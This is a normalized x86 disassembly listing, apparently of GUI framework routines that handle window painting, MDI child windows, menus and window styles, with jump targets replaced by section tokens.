call sub_443dbc
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_420160
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_4476b0
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_420134
mov si 0xfff1
call sub_403418
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_420170
jmp r-xdata
sub_4598f0
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_440a8c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_441a58
sub_459918
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4402c0
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_459948
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_440304
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_459978
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_4407c4
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_45aab0
pop esi
pop ebx
retn
sub_4599bc
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_459a15
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459a1c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
sub_459a24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_440778
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_4445e4
mov eax ebx
call sub_444780
sub_459a5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41ffac
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_459a9c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444aa0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403418
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403418
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_441a58
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_453b18
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a3c8
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_459d15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459cf8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_423e4c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_423cec
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4550a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459cff
xor edx edx
mov eax [ ebp - 0xc ]
call sub_423e4c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_453b18
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a3c8
call sub_4470c4
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_459e43
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_459e1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459dff
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_423e4c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_423cec
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459e06
xor edx edx
mov eax [ ebp - 0xc ]
call sub_423e4c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_4470c4
mov esi eax
sub_459e23
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ReleaseDC
retn
sub_459ed4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_459f20
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45a3fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45a448
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_459f60
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_45a12e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4236b8
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_444d40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4403e8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43f1e0
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_459ed4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4236b8
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_45a3fc
test eax eax
je r-xdata
push ebp
call sub_459ed4
pop ecx
push ebp
call sub_459ed4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_459f20
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_457240
jmp r-xdata
sub_45a140
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_458408
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_45a1ac
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_458aa4
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax ebx
call sub_420160
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_4470c4
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_443eb0
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_4470c4
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_420134
call sub_45465c
mov edx esi
mov eax ebx
call sub_420134
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
sub_45a244
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_45a2c1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_45a2cc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44462c
sub_45a2f8
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_44462c
xor edx edx
jmp r-xdata
mov eax esi
call sub_458584
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_45a330
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_4400a8
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_44462c
sub_45a374
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4401b4
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_45a3c8
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43d784
sub_45a3fc
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45df6c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45df58
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45a448
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45df6c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45df58
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_45a498
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_41a040
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_45a4c8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_4470c4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45df3c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45df3c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_45a498
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45df3c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45df28
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_41a19c
call sub_40321c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45df28
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45df28
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45df28
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_45a5cc
push ebx
mov ebx eax
mov eax ebx
call sub_45a5c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_429b14
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45a5f4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_4445e4
mov dl 0x1
mov eax esi
call sub_45a958
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_45a9d4
mov edx eax
mov eax esi
call sub_440a44
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_444780
mov dl 0x1
mov eax esi
call sub_459978
sub_45a674
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_4470c4
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_450c58
mov edi eax
mov eax ebp
call sub_4470c4
push eax
call DrawMenuBar
sub_45a6f0
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41fc0c
xor edx edx
mov eax ebx
call sub_4525f0
sub_45a714
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_45a674
mov eax edx
mov edx ebx
call sub_41fc0c
sub_45a73c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a902
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45df6c
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_4541a4
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45df58
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41fc0c
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45df58
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
mov eax ebx
call sub_4473c8
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_4470c4
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45a674
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a909
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov dl 0x1
mov eax ebx
call sub_45b800
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_4470c4
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_4470c4
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_4470c4
mov edx eax
mov eax esi
call sub_4541a4
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_4470c4
push eax
call SetMenu
sub_45a924
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a910
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_45a980
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45a974
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_45a9ec
push ebx
mov ebx eax
mov eax ebx
call sub_4466a4
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_45a9d4
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45a9d4
mov edx eax
mov eax ebx
call sub_440a44
mov edx 0xff00000f
mov eax ebx
call sub_440a44
pop ebx
retn
sub_45aa70
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4470c4
push eax
call ShowWindow
sub_45aab0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_45a4c8
mov eax [ eax + 0x4 ]
